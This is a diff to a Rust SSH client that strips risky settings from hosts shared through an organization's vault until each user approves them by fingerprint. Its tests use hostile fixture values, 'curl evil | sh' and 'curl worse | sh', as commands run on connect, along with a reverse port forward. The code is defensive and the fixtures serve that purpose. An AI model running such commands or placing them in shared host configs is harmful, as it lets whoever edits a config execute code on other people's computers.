@@ -1,7 +1,7 @@
 //! The collections of an organization the vault holds, as host lists show
 //! them (docs/design/collections.md): on the desktop and the phones alike.
 
-use shellwing_config::{Host, Hosts};
+use shellwing_config::{Host, HostKey, HostX11, Hosts};
 use shellwing_i18n::tr;
 use shellwing_vault::{CollectionInfo, Space, Vault};
 
@@ -89,6 +89,166 @@ pub fn merged(personal: &Hosts, collections: &[CollectionHosts]) -> Hosts {
         hosts.hosts.extend(c.hosts.iter().cloned());
     }
     hosts
+}
+
+/// What a collection's host asks to do on the computer of whoever connects
+/// to it. Anybody who may edit the collection writes these, so each person
+/// allows them once for a host, and again when they change; until then the
+/// host connects without them ([`without_asks`]).
+#[derive(Clone, Debug, PartialEq)]
+pub struct Asks {
+    /// Each, as people read it.
+    pub items: Vec<String>,
+    /// What is allowed: SHA-256 of the settings themselves, in hex.
+    pub fingerprint: String,
+}
+
+/// What `h` asks, if it is a collection's host that asks anything.
+pub fn asks(h: &Host) -> Option<Asks> {
+    h.collection.as_ref()?;
+    let mut items = vec![];
+    let mut settings: Vec<(&str, String)> = vec![];
+    if let Some(c) = h
+        .proxy_command
+        .as_deref()
+        .map(str::trim)
+        .filter(|c| !c.is_empty())
+        && h.jump.is_empty()
+    {
+        items.push(tr!(
+            "Runs a command on this computer to connect: {command}",
+            command = c
+        ));
+        settings.push(("proxy_command", c.to_string()));
+    }
+    if !h.jump.is_empty() {
+        let through = h.jump.join(", ");
+        items.push(tr!(
+            "Goes through {hosts} first, as this computer knows them",
+            hosts = through.clone()
+        ));
+        settings.push(("jump", through));
+    }
+    for f in &h.forward {
+        items.push(tr!("Forwards ports: {forward}", forward = f.clone()));
+        settings.push(("forward", f.clone()));
+    }
+    if h.forward_agent {
+        items.push(tr!("Lets the host use your ssh-agent while connected"));
+        settings.push(("forward_agent", "true".into()));
+    }
+    match h.x11 {
+        Some(HostX11::Trusted) => {
+            items.push(tr!(
+                "Lets its programs open windows here and read your keyboard (trusted X11)"
+            ));
+            settings.push(("x11", "trusted".into()));
+        }
+        Some(HostX11::Untrusted) => {
+            items.push(tr!("Lets its programs open windows here (X11)"));
+            settings.push(("x11", "untrusted".into()));
+        }
+        Some(HostX11::Off) | None => {}
+    }
+    if h.host_key == Some(HostKey::AcceptNew) {
+        items.push(tr!(
+            "Takes the host's key the first time without asking you"
+        ));
+        settings.push(("host_key", "accept-new".into()));
+    }
+    if let Some(r) = h.run.as_deref().map(str::trim).filter(|r| !r.is_empty()) {
+        items.push(tr!(
+            "Types a command into its shell once connected: {command}",
+            command = r
+        ));
+        settings.push(("run", r.to_string()));
+    }
+    if items.is_empty() {
+        return None;
+    }
+    use sha2::Digest;
+    let json = serde_json::to_vec(&settings).unwrap_or_default();
+    let fingerprint = sha2::Sha256::digest(&json)
+        .iter()
+        .map(|b| format!("{b:02x}"))
+        .collect();
+    Some(Asks { items, fingerprint })
+}
+
+/// `h` without what it asks ([`asks`]): how a collection's host connects
+/// until the person allows it. What their own `~/.ssh/config` says for the
+/// address still applies: it is theirs.
+pub fn without_asks(h: &Host) -> Host {
+    let mut h = h.clone();
+    h.proxy_command = None;
+    h.jump.clear();
+    h.forward.clear();
+    h.forward_agent = false;
+    if h.x11 != Some(HostX11::Off) {
+        h.x11 = None;
+    }
+    if h.host_key == Some(HostKey::AcceptNew) {
+        h.host_key = None;
+    }
+    h.run = None;
+    h
+}
+
+/// A collection's host on the way to a connection that asks what the
+/// person has not allowed.
+#[derive(Clone, Debug, PartialEq)]
+pub struct Unallowed {
+    pub id: String,
+    pub name: String,
+    pub asks: Asks,
+}
+
+/// `hosts` with every collection's host on the way to `spec`, itself and the
+/// jump hosts it goes through, without what it asks unless the person
+/// allowed it (`allowed`: host id → fingerprint). Gives those hosts, to
+/// offer allowing; None when nothing is held back.
+pub fn unless_allowed(
+    hosts: &Hosts,
+    spec: &str,
+    allowed: &std::collections::BTreeMap<String, String>,
+) -> Option<(Hosts, Vec<Unallowed>)> {
+    let mut held = vec![];
+    let mut seen = vec![];
+    let mut next = vec![spec.to_string()];
+    // As far as a chain of jumps may go (target.rs refuses longer ones).
+    while let Some(name) = next.pop() {
+        if seen.len() > 16 {
+            break;
+        }
+        let Some(h) = hosts.find(&name) else {
+            continue;
+        };
+        let key = h.id.clone().unwrap_or_else(|| h.name.clone());
+        if seen.contains(&key) {
+            continue;
+        }
+        seen.push(key);
+        next.extend(h.jump.iter().cloned());
+        if let (Some(a), Some(id)) = (asks(h), h.id.clone())
+            && allowed.get(&id) != Some(&a.fingerprint)
+        {
+            held.push(Unallowed {
+                id,
+                name: h.name.clone(),
+                asks: a,
+            });
+        }
+    }
+    if held.is_empty() {
+        return None;
+    }
+    let mut out = hosts.clone();
+    for host in out.hosts.iter_mut() {
+        if host.collection.is_some() && held.iter().any(|u| host.id.as_ref() == Some(&u.id)) {
+            *host = without_asks(host);
+        }
+    }
+    Some((out, held))
 }
 
 /// `c` if the person may change its hosts, else why not.
@@ -220,5 +380,76 @@ mod tests {
         delete_host(&v, &c, &id).expect("delete");
         assert!(hosts_of(&v, &info()).is_empty());
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    fn shared(text: &str) -> Hosts {
+        let mut hosts: Hosts = toml::from_str(text).expect("hosts");
+        for h in hosts.hosts.iter_mut().filter(|h| h.name != "mine") {
+            h.collection = Some("col1".into());
+            h.id = Some(format!("id-{}", h.name));
+        }
+        hosts
+    }
+
+    #[test]
+    fn a_collections_host_connects_without_what_it_asks_until_allowed() {
+        let hosts = shared(
+            "[[host]]\nname = \"db\"\naddress = \"10.0.0.9\"\nproxy_command = \"nc %h %p\"\n\
+             forward = [\"-R 9000:localhost:22\"]\nforward_agent = true\nx11 = \"trusted\"\n\
+             host_key = \"accept-new\"\nrun = \"curl evil | sh\"\n\n\
+             [[host]]\nname = \"plain\"\naddress = \"10.0.0.8\"\n\n\
+             [[host]]\nname = \"mine\"\naddress = \"10.0.0.7\"\nproxy_command = \"nc %h %p\"\n",
+        );
+        let db = hosts.find("db").expect("db");
+        let a = asks(db).expect("asks");
+        assert_eq!(a.items.len(), 6, "{:?}", a.items);
+        assert!(
+            asks(hosts.find("plain").expect("plain")).is_none(),
+            "nothing to ask"
+        );
+        assert!(
+            asks(hosts.find("mine").expect("mine")).is_none(),
+            "one's own asks nothing"
+        );
+
+        let none = std::collections::BTreeMap::new();
+        let (held, which) = unless_allowed(&hosts, "id-db", &none).expect("held back");
+        assert_eq!(which.len(), 1);
+        let db = held.find("id-db").expect("db");
+        assert_eq!(db.proxy_command, None);
+        assert!(db.forward.is_empty() && !db.forward_agent && db.run.is_none());
+        assert_eq!((db.x11, db.host_key), (None, None));
+        assert_eq!(db.address, "10.0.0.9", "the rest as it is");
+
+        let allowed = [("id-db".to_string(), a.fingerprint.clone())].into();
+        assert!(
+            unless_allowed(&hosts, "id-db", &allowed).is_none(),
+            "allowed"
+        );
+        // Changed, it is asked again.
+        let mut changed = hosts.clone();
+        changed.hosts[0].run = Some("curl worse | sh".into());
+        assert!(unless_allowed(&changed, "id-db", &allowed).is_some());
+    }
+
+    #[test]
+    fn a_jump_host_of_the_collection_is_held_back_too() {
+        let hosts = shared(
+            "[[host]]\nname = \"db\"\naddress = \"10.0.0.9\"\njump = [\"edge\"]\n\n\
+             [[host]]\nname = \"edge\"\naddress = \"10.0.0.1\"\nproxy_command = \"nc %h %p\"\n",
+        );
+        let a = asks(hosts.find("id-db").expect("db")).expect("asks");
+        let allowed = [("id-db".to_string(), a.fingerprint)].into();
+        let (held, which) = unless_allowed(&hosts, "id-db", &allowed).expect("edge asks");
+        assert_eq!(
+            which.iter().map(|u| u.name.as_str()).collect::<Vec<_>>(),
+            ["edge"]
+        );
+        assert_eq!(held.find("id-edge").expect("edge").proxy_command, None);
+        assert_eq!(
+            held.find("id-db").expect("db").jump,
+            ["edge"],
+            "allowed: kept"
+        );
     }
 }
